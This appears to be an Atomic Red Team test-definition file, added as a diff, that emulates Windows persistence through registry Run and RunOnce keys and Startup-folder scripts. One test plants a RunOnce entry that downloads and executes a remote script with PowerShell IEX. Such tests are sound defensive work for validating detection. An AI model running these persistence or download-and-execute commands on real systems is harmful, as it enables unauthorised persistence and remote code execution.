@@ -1,0 +1,123 @@
+attack_technique: T1547.001
+display_name: 'Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder'
+atomic_tests:
+- name: Reg Key Run
+  auto_generated_guid: e55be3fd-3521-4610-9d1a-e210e42dcf05
+  description: |
+    Run Key Persistence
+
+    Upon successful execution, cmd.exe will modify the registry by adding \"Atomic Red Team\" to the Run key. Output will be via stdout. 
+  supported_platforms:
+  - windows
+  input_arguments:
+    command_to_execute:
+      description: Thing to Run
+      type: Path
+      default: C:\Path\AtomicRedTeam.exe
+  executor:
+    command: |
+      REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /F /D "#{command_to_execute}"
+    cleanup_command: |
+      REG DELETE "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /f >nul 2>&1
+    name: command_prompt
+- name: Reg Key RunOnce
+  auto_generated_guid: 554cbd88-cde1-4b56-8168-0be552eed9eb
+  description: |
+    RunOnce Key Persistence.
+
+    Upon successful execution, cmd.exe will modify the registry to load AtomicRedTeam.dll to RunOnceEx. Output will be via stdout. 
+  supported_platforms:
+  - windows
+  input_arguments:
+    thing_to_execute:
+      description: Thing to Run
+      type: Path
+      default: C:\Path\AtomicRedTeam.dll
+  executor:
+    command: |
+      REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "#{thing_to_execute}"
+    cleanup_command: |
+      REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /f >nul 2>&1
+    name: command_prompt
+- name: PowerShell Registry RunOnce
+  auto_generated_guid: eb44f842-0457-4ddc-9b92-c4caa144ac42
+  description: |
+    RunOnce Key Persistence via PowerShell
+    Upon successful execution, a new entry will be added to the runonce item in the registry.
+  supported_platforms:
+  - windows
+  input_arguments:
+    thing_to_execute:
+      description: Thing to Run
+      type: Path
+      default: powershell.exe
+    reg_key_path:
+      description: Path to registry key to update
+      type: Path
+      default: HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce
+  executor:
+    command: |
+      $RunOnceKey = "#{reg_key_path}"
+      set-itemproperty $RunOnceKey "NextRun" '#{thing_to_execute} "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`")"'
+    cleanup_command: |
+      Remove-ItemProperty -Path #{reg_key_path} -Name "NextRun" -Force -ErrorAction Ignore
+    name: powershell
+    elevation_required: true
+- name: Suspicious vbs file run from startup Folder
+  auto_generated_guid: 2cb98256-625e-4da9-9d44-f2e5f90b8bd5
+  description: |
+    vbs files can be placed in and ran from the startup folder to maintain persistance. Upon execution, "T1547.001 Hello, World VBS!" will be displayed twice. 
+    Additionally, the new files can be viewed in the "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+    folder and will also run when the computer is restarted and the user logs in.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      Copy-Item $PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs"
+      Copy-Item $PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs"
+      cscript.exe "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs"
+      cscript.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs"
+    cleanup_command: |
+      Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs" -ErrorAction Ignore
+      Remove-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs" -ErrorAction Ignore
+    name: powershell
+    elevation_required: true
+- name: Suspicious jse file run from startup Folder
+  auto_generated_guid: dade9447-791e-4c8f-b04b-3a35855dfa06
+  description: |
+    jse files can be placed in and ran from the startup folder to maintain persistance.
+    Upon execution, "T1547.001 Hello, World JSE!" will be displayed twice. 
+    Additionally, the new files can be viewed in the "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+    folder and will also run when the computer is restarted and the user logs in.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      Copy-Item $PathToAtomicsFolder\T1547.001\src\jsestartup.jse "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse"
+      Copy-Item $PathToAtomicsFolder\T1547.001\src\jsestartup.jse "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse"
+      cscript.exe /E:Jscript "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse"
+      cscript.exe /E:Jscript "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse"
+    cleanup_command: |
+      Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse" -ErrorAction Ignore
+      Remove-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse" -ErrorAction Ignore
+    name: powershell
+    elevation_required: true
+- name: Suspicious bat file run from startup Folder
+  auto_generated_guid: 5b6768e4-44d2-44f0-89da-a01d1430fd5e
+  description: |
+    bat files can be placed in and executed from the startup folder to maintain persistance.
+    Upon execution, cmd will be run and immediately closed. Additionally, the new files can be viewed in the "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+    folder and will also run when the computer is restarted and the user logs in.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      Copy-Item $PathToAtomicsFolder\T1547.001\src\batstartup.bat "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat"
+      Copy-Item $PathToAtomicsFolder\T1547.001\src\batstartup.bat "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat"
+      Start-Process "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat"
+      Start-Process "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat"
+    cleanup_command: |
+      Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat" -ErrorAction Ignore
+      Remove-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat" -ErrorAction Ignore
+    name: powershell
+    elevation_required: true
